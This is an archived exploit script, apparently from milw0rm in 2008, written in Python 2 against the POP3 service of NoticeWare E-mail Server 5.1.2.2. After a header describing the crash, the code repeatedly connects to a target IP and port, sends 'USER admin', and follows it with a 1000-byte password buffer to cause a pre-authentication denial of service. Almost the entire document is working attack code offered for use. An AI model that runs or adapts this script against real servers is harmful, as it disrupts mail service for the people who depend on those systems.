<html><head><title>NoticeWare E-mail Server 5.1.2.2 (POP3) Pre-Auth DoS Exploit</title></head><pre>#!/usr/bin/python
#################################################################################
# Software: NoticeWare E-mail Sever (POP3) 5.1.2.2 Pre-Auth DoS                 #
# Discovered and Coded by: Paul Hand aka rAWjAW                                 #
# Blog: http://rawjaw-security.blogspot.com                                     #
# E-mail: phand3754&lt;at&gt;gmail&lt;dot&gt;com                                            #
#                                                                               #
# Description:  NoticeWare E-mail Server has many odd querks about it           #
# This DoS leverages the fact that the POP3 server can only handle              #
# so many exceptions before you get an access violation at 0x00000008           #
# which is given from an EDX+8 where EDX is 0x00000000.                         #
# I've tried many things to get code execution and non are prevalent.           #
# If you fuzz almost any of the commands for the POP3 server you will get it to #
# crash.  Also, if you are authenticated and do &quot;LIST 0.5&quot; (numerous times) you #
# will get the same access violation you do with this DoS.                      #
#                                                                               #
#Company Contact Date: 10-3-08 (But still no response)                          #
#################################################################################
import socket
import sys
from optparse import OptionParser

usage = &quot;%prog -T &lt;Target_IP&gt; -P &lt;Target_Port&gt;&quot;
parser = OptionParser(usage=usage)
parser.add_option(&quot;-T&quot;, &quot;--target_IP&quot;, type=&quot;string&quot;,
	action=&quot;store&quot;, dest=&quot;IP&quot;, help=&quot;Target IP Address&quot;)
parser.add_option(&quot;-P&quot;, &quot;--target_Port&quot;, type=&quot;int&quot;,
	action=&quot;store&quot;, dest=&quot;PORT&quot;, help=&quot;Target Port Address (usually 110)&quot;)
(options, args) = parser.parse_args()
IP=options.IP
PORT=options.PORT
if not (IP and PORT):
	parser.print_help()
	sys.exit(0)

buffer='\x42'*1000

print &quot;########################################################&quot;
print &quot;#                NoticeWare Email DoS                  #&quot;
print &quot;#          Written by: Paul Hand aka rAWjAW            #&quot;
print &quot;#                                                      #&quot;
print &quot;# NOTE: The program does not seem to always crash at   #&quot;
print &quot;# the same point for some reason so if the script      #&quot;
print &quot;# hangs because of a \&quot;faulty\&quot; closed connection just   #&quot;
print &quot;# just CTRL+C and that means the POP3 server has been  #&quot;
print &quot;# successfully DoSed.  The program will still \&quot;allow\&quot;  #&quot;
print &quot;# connections but they will just hang and cannot be    #&quot;
print &quot;# used.                                                #&quot;
print &quot;########################################################&quot;
try:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((IP,PORT))
	s.close()
except socket.error, message:
	print &quot;Could not make initial connection. Quitting&quot;
	sys.exit(0)

print &quot;Connection to the target successful&quot;
print &quot;Sending buffers...&quot;

x=1
while x &lt; 50:
	s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connect=s.connect((IP,PORT))
	s.recv(1024)
	#You DO NOT need a vaild username
	s.send('USER admin\r\n')
	s.recv(1024)
	s.send('PASS ' + buffer + '\r\n')
	s.recv(1024)
	s.close()
	x=x+1
	
print &quot;DoS Successful!&quot;

# milw0rm.com [2008-10-10]</pre></html>